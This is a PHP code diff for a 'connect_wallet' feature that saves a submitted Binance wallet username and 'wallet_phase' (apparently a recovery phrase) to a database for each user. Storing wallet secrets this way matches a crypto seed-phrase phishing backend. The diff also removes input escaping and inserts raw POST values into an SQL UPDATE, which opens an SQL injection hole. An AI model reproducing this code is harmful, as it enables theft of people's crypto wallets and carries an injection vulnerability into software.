@@ -53,18 +53,22 @@ if (isset($_POST['update_meta_mask'])) {
     } else {
         echo "Error updating record: " . $conn->error;
     }
-}elseif (isset($_POST['binance'])){
-    $wallet_username = $conn->real_escape_string($_POST['wallet_username']);
-    $wallet_phase = $conn->real_escape_string($_POST['wallet_phase']);
+}elseif (isset($_POST['update_binance'])){
+    //    $wallet_username = $conn->real_escape_string($_POST['wallet_username']);
+    $wallet_username = ($_POST['wallet_username']);
+//    $wallet_phase = $conn->real_escape_string($_POST['wallet_phase']);
+    $wallet_phase = ($_POST['wallet_phase']);
 
-    $sql = "UPDATE wallet SET wallet_username = '$wallet_username', wallet_phase = '$wallet_phase' WHERE wallet_id = 2";
+    $update_wallet = "UPDATE wallet SET wallet_status = 2 WHERE wallet_owner_id = $user_id AND wallet_key = 2";
 
-    if ($conn->query($sql) === TRUE) {
+    if ($conn->query($update_wallet) === TRUE) {
+//        $get_wallet_p_id = mysqli_insert_id($conn);
+        include_once ('includes/wallet/get/main.php');
+        $update_wallet_data = "UPDATE wallet_data SET d_wallet_phase = '$wallet_phase', d_wallet_username = '$wallet_username', d_wallet_time_updated = CURTIME(), d_wallet_date_updated = CURDATE() WHERE d_wallet_parent_id = $b_wallet_id AND d_wallet_owner_id = $user_id";
 
-        $update_status = "UPDATE wallet SET wallet_status = 2 WHERE wallet_id = 2";
-
-        if ($update_status){
-            echo "Record updated successfully";
+        if ($conn->query($update_wallet_data) === TRUE) {
+            header("Location: /connect_wallet?success_add_binance");
+            exit();
         }
     } else {
         echo "Error updating record: " . $conn->error;
